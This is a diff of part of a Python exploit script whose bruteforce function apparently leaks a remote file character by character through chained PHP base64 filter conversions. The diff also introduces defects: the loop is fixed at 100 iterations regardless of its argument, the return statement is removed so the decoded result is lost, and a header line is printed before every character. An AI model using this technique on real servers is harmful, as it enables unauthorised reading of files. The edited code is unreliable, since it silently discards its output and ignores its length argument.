@@ -451,13 +451,15 @@ def find_letter(prefix):
 def bruteforce(n):
     """ Brute force the string for n chars """
     o = ''
-    for i in range(n):
+    for i in range(100):
         prefix = f'{HEADER}|{get_nth(i)}'
         letter = find_letter(prefix)
-        # it's a number, check base64
+        
+        # It's a number
         if letter == '*':
             prefix = f'{HEADER}|{get_nth(i)}|convert.base64-encode'
             s = find_letter(prefix)
+            
             if s == 'M':
                 # 0 - 3
                 prefix = f'{HEADER}|{get_nth(i)}|convert.base64-encode|{R2}'
@@ -471,7 +473,8 @@ def bruteforce(n):
                 elif ss in 'yz*':
                     letter = '3'
                 else:
-                    err('[-] Something went wrong!')
+                    err(f'Bad number: {ss}')
+            
             elif s == 'N':
                 # 4 - 7
                 prefix = f'{HEADER}|{get_nth(i)}|convert.base64-encode|{R2}'
@@ -485,7 +488,8 @@ def bruteforce(n):
                 elif ss in 'yz*':
                     letter = '7'
                 else:
-                    err('[-] Something went wrong!')
+                    err(f'Bad number: {ss}')
+            
             elif s == 'O':
                 # 8 - 9
                 prefix = f'{HEADER}|{get_nth(i)}|convert.base64-encode|{R2}'
@@ -495,18 +499,19 @@ def bruteforce(n):
                 elif ss in 'STUVWX':
                     letter = '9'
                 else:
-                    err('[-] Something went wrong!')
+                    err(f'Bad number: {ss}')
             else:
-                err('[!] Wtf happened?')
-
-        print(end=letter)
+                err('wtf')
+        
+        print("[*] Decoded characters:")
+        print(end=letter)  
         o += letter
         sys.stdout.flush()
-        
-    return o
-    """
-    Done!!! 
-    """
+    
+    print()
+"""
+We are done!!!
+"""
 
 
 def b64_padding(s):
